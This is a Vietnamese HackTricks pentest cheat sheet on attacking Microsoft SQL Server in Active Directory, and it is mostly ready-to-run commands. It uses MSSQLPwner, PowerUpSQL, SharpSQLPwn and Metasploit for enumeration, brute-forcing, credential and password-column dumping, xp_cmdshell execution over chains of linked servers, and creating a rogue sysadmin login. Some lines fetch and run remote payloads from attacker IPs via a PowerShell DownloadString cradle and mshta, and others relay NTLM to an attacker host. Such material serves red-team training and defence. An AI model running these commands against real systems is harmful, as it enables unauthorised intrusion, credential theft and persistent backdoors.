# Lạm dụng MSSQL AD

{{#include ../../banners/hacktricks-training.md}}


## **Liệt kê / Khám phá MSSQL**

### Python

Công cụ [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) dựa trên Impacket. Công cụ này hỗ trợ xác thực bằng Kerberos tickets và tấn công thông qua các chuỗi linked-server.<sup>[[1]](#references)</sup>

<figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
  
```shell
# Interactive mode
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive

# Interactive mode with 2 depth level of impersonations

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -max-impersonation-depth 2 interactive

# Executing custom assembly on the current server with windows authentication and executing hostname command

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname

# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname

# Executing the hostname command using stored procedures on the linked SRV01 server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname

# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate

# Issuing NTLM relay attack on the SRV01 server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250

# Executing direct query

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"

# Retrieving password from the linked server DC01

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password

# Execute code using custom assembly on the linked server DC01

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll

# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt

```

### Liệt kê từ mạng mà không cần phiên đăng nhập domain

```

# Interactive mode

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive

```

---
### PowerShell

Module PowerShell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) cung cấp các chức năng khám phá, kiểm tra và khai thác môi trường SQL Server.<sup>[[2]](#references)</sup>

```bash
Import-Module .\PowerupSQL.psd1
```

### Liệt kê từ mạng mà không có phiên domain

```bash
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have an AD account, you can try to find MSSQL instances by scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```

### Liệt kê từ bên trong miền

```bash
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

# Try dictionary attack to login
Invoke-SQLAuditWeakLoginPw

# Search SPNs of common software and try the default creds
Get-SQLServerDefaultLoginPw 

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check connectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in one line
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```

## Lạm dụng MSSQL cơ bản

### Truy cập DB

```bash
# List databases
Get-SQLInstanceDomain | Get-SQLDatabase

# List tables in a DB you can read
Get-SQLInstanceDomain | Get-SQLTable -DatabaseName DBName

# List columns in a table
Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName DBName -TableName TableName

# Get some sample data from a column in a table (columns username & password in the example)
Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords "username,password" -Verbose -SampleSize 10

#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lot of CSVs are generated in the current directory)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```

### MSSQL RCE

Cũng có thể **thực thi lệnh** trên máy chủ MSSQL thông qua `xp_cmdshell`.<sup>[[5]](#references)</sup>

```bash
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```

Xem trang được đề cập trong **phần sau để biết cách thực hiện thủ công.**

### MSSQL Basic Hacking Tricks


{{#ref}}
../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
{{#endref}}

## MSSQL Trusted Links

Nếu một instance MSSQL tin cậy instance khác thông qua cấu hình linked-server, người dùng có đủ quyền có thể **lợi dụng mối quan hệ tin cậy đó để thực thi truy vấn trên instance còn lại**. Có thể kết nối chuỗi các liên kết này để tiếp cận một server bị cấu hình sai, nơi người dùng có thể thực thi lệnh.<sup>[[3]](#references)</sup>

**Các liên kết giữa các database vẫn hoạt động ngay cả khi có forest trust.**

### Powershell Abuse

```bash
#Look for MSSQL links from an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkId > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted-link query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```

Một công cụ khác có thể được sử dụng là [**SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):<sup>[[6]](#references)</sup>

```bash
SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
# Cobalt Strike
inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
```

### Metasploit

Bạn có thể dễ dàng kiểm tra các liên kết đáng tin cậy bằng Metasploit.

```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```

Metasploit chỉ cố khai thác hàm `OPENQUERY()`. Nếu thực thi lệnh qua `OPENQUERY()` thất bại, hãy thử phương thức `EXECUTE` **thủ công** như mô tả bên dưới.<sup>[[4]](#references)</sup>

### Thủ công - Openquery()

Từ **Linux**, bạn có thể lấy shell console MSSQL bằng **sqsh** và **mssqlclient.py.**

Từ **Windows**, bạn cũng có thể tìm các liên kết và thực thi lệnh thủ công bằng **MSSQL client như** [**HeidiSQL**](https://www.heidisql.com).<sup>[[7]](#references)</sup>

_Đăng nhập bằng xác thực Windows:_

![Metasploit - Thủ công - Openquery(): Đăng nhập bằng xác thực Windows](<../../images/image (808).png>)

#### Tìm các liên kết đáng tin cậy

```sql
select * from master..sysservers;
EXEC sp_linkedservers;
```

![Thủ công - Openquery() - Tìm các liên kết đáng tin cậy: EXEC sp linkedservers;](<../../images/image (716).png>)

#### Thực thi truy vấn qua liên kết đáng tin cậy

Thực thi truy vấn thông qua liên kết (ví dụ: tìm thêm liên kết trong instance mới có thể truy cập):

```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```

> [!WARNING]
> Kiểm tra vị trí dùng dấu ngoặc kép và dấu ngoặc đơn, dùng đúng loại rất quan trọng.

![Tìm các liên kết đáng tin cậy - Thực thi truy vấn trong liên kết đáng tin cậy: Kiểm tra vị trí dùng dấu ngoặc kép và dấu ngoặc đơn, dùng đúng loại rất quan trọng](<../../images/image (643).png>)

Bạn có thể tiếp tục lần theo các chuỗi liên kết đáng tin cậy này theo cách thủ công.

```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```

Nếu bạn không thể thực hiện các thao tác như `exec xp_cmdshell` thông qua `OPENQUERY()`, hãy thử phương thức `EXECUTE`.

### Thủ công - EXECUTE

Bạn cũng có thể abuse các liên kết đáng tin cậy bằng `EXECUTE`:

```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```

## Leo thang đặc quyền cục bộ

**Tài khoản dịch vụ MSSQL** thường có quyền người dùng **`SeImpersonatePrivilege`**, cho phép tài khoản giả mạo một client sau khi xác thực.

Một chiến thuật được nhiều tác giả đề xuất là buộc một dịch vụ SYSTEM xác thực với một dịch vụ giả mạo hoặc man-in-the-middle do attacker tạo. Sau đó, dịch vụ giả mạo này có thể giả mạo dịch vụ SYSTEM trong lúc dịch vụ đó đang cố xác thực.

[SweetPotato](https://github.com/CCob/SweetPotato) tổng hợp một số kỹ thuật này và có thể được thực thi thông qua lệnh `execute-assembly` của Beacon.<sup>[[8]](#references)</sup>



### Chuyển tiếp NTLM từ SCCM Management Point (Trích xuất bí mật OSD)
Tìm hiểu cách các vai trò SQL mặc định của SCCM **Management Points** có thể bị lạm dụng để trích xuất Network Access Account và các bí mật trong Task Sequence trực tiếp từ cơ sở dữ liệu của site:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

## References

- [1] [ScorpionesLabs – MSSqlPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
- [2] [NetSPI – PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
- [3] [Microsoft Learn – Máy chủ được liên kết (Database Engine)](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine?view=sql-server-ver17)
- [4] [Microsoft Learn – OPENQUERY](https://learn.microsoft.com/en-us/sql/t-sql/functions/openquery-transact-sql?view=sql-server-ver17)
- [5] [Microsoft Learn – Tùy chọn cấu hình máy chủ xp_cmdshell](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver17)
- [6] [lefayjey – SharpSQLPwn](https://github.com/lefayjey/SharpSQLPwn)
- [7] [HeidiSQL](https://www.heidisql.com)
- [8] [CCob – SweetPotato](https://github.com/CCob/SweetPotato)
{{#include ../../banners/hacktricks-training.md}}
